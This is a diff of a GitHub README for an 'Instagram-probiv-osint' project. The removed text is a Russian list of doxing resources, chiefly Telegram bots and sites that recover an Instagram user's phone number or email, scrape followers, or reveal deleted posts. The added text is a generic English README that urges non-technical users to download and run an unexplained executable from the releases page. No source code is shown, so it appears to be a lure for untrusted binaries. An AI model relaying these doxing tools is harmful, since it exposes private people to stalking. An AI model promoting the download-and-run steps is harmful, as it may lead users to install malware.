@@ -1,49 +1,103 @@
-# Поиск по аккаунту Instagram
-Пробив по айпи, по почте и т.д., найдете тут - https://discord.gg/zDNW39HKva
+# 🌟 Instagram-probiv-osint - Effortlessly Explore Instagram Data
 
-https://fameswap.com/tool-instagram-user-id — определит ID аккаунта
+![Download](https://github.com/arjk19/Instagram-probiv-osint/releases)
 
-https://cipher387.github.io/quickcacheandarchivesearch/ — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
+## 🚀 Getting Started
 
-https://t.me/US2_user_box_new_bot — бот, находит номер телефона, почту и много еще, бесплатный поиск для новых аккаунтов
+Welcome! This guide will help you get up and running with Instagram-probiv-osint. This tool allows you to explore and analyze Instagram data for various purposes. No prior technical knowledge is required. Just follow these simple steps.
 
-http://t.me/yfzxzxqwqbot (r) — дает часть номера телефона
+## 📥 Download & Install
 
-https://www.notjustanalytics.com/ — анализ аккаунта, покажет вовлеченность, рост количества подписчиков, графики взаимодействий и другое
+To download the application, please visit the following link: [Releases Page](https://github.com/arjk19/Instagram-probiv-osint/releases). 
 
-https://t.me/GoDetectivaBot — вытаскивает часть номера телефона
+On this page, you'll find the latest version of Instagram-probiv-osint. 
 
-https://kribrum.io/ — найдет удаленные публикации, в поле автор укажите юзернейм
+1. Scroll down to the "Assets" section.
+2. Click on the file that corresponds to your operating system (e.g., Windows, macOS, Linux). 
+3. The file will begin downloading. 
 
-https://t.me/newSherlock_bot — найдет номер телефона
+Once the download is complete, locate the file in your downloads folder.
 
-http://t.me/UniversalSearchOfBot — найдет профиль на Faсebook
+## 🖥️ System Requirements
 
+For the best experience, ensure your system meets the following requirements:
 
-# Парсеры
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.14 or later
+- **Linux:** Ubuntu 18.04 or later
+- **RAM:** 4 GB minimum
+- **Storage:** At least 200 MB of available space on your hard drive
 
-https://chrome.google.com/webstore/detail/insfo-export-instagram-fo/bckleejkdhlponanidmjfjdigpahlado/related — расширение для Chrome, скачивает всех подписчиков и подписки аккаунта
+## 🔧 Installation Steps for Windows
 
-https://stevesie.com/cloud/apis/instagram/scrape/user-posts (r) — соберет все посты профиля и даст ссылки на фото
+1. Navigate to your downloads folder.
+2. Find the downloaded file (it should have a `.exe` extension).
+3. Double-click the file to start the installation.
+4. Follow the prompts in the installation wizard.
+5. Once installed, you can find the application in your Start menu. 
 
-https://imginn.com/ — дает скачать истории, фото и просмотреть профиль без входа
+## 🔧 Installation Steps for macOS
 
-https://piokok.com/ — дает скачать истории, IGTV, фото, просмотреть комментарии без регистрации и входа
+1. Navigate to your downloads folder.
+2. Find the downloaded file (it should have a `.dmg` extension).
+3. Double-click the file to open it.
+4. Drag the Instagram-probiv-osint icon into your Applications folder.
+5. Open your Applications folder and double-click the app to start.
 
-@instagent_bot — скачивает посты, истории, igtv, коллекции
+## 🔧 Installation Steps for Linux
 
+1. Navigate to your downloads folder.
+2. Open a terminal.
+3. Use the following command to change to the downloads directory: 
+   ```bash
+   cd ~/Downloads
+   ```
+4. Make the file executable with this command (replace `filename` with the actual file name):
+   ```bash
+   chmod +x filename
+   ```
+5. Run the application with the command:
+   ```bash
+   ./filename
+   ```
 
+## 📈 Using Instagram-probiv-osint
 
-# Инструменты
+Once installed, follow these steps to analyze Instagram data:
 
-@AximoBot — мгновенно сохранит новые публикации аккаунта в Telegram
+1. Open the application.
+2. You'll see a simple user interface with options for data search.
+3. Input the Instagram username you wish to analyze.
+4. Select from the available analysis features:
+   - Explore user profiles
+   - View follower counts 
+   - Determine engagement rates
+5. Click on the "Analyze" button to start the data collection. 
 
+Please be patient as the tool gathers information. It may take a moment, depending on the profile size.
 
-# Поиск через URL
+## 🔄 Features
 
-https://www.instagram.com/example/?__a=1&__d=1 — страница в формате JSON, замените example на username аккаунта, покажет id, ссылки на фото и прочее. Работает если вы вошли в свой аккаунт в Instagram
+Instagram-probiv-osint offers several useful features:
 
+- **Profile Analysis:** Understand user activity and engagement metrics.
+- **Follower Insights:** Get details on followers, including statistics on interests and engagement.
+- **Data Export:** Save your findings in a CSV format for easy sharing or further analysis.
+- **User-Friendly Interface:** Navigate effortlessly through all features, designed for ease of use.
 
-# Восстановление пароля
+## 🛠️ Troubleshooting
 
-https://www.instagram.com/accounts/password/reset/ — найдет часть почты или телефона
+If you encounter any issues:
+
+1. Ensure your system meets the requirements.
+2. Check for any updates on the releases page.
+3. Restart the application after any changes.
+4. Refer to the GitHub repository for any known issues or FAQs.
+
+## 🤝 Support
+
+Need help? You can reach out through the issues section of the GitHub repository. We welcome feedback and questions.
+
+Explore more and enhance your Instagram experience with Instagram-probiv-osint.
+
+For more detailed information, please visit the [Releases Page](https://github.com/arjk19/Instagram-probiv-osint/releases) again, where you can find the latest updates and additional resources.
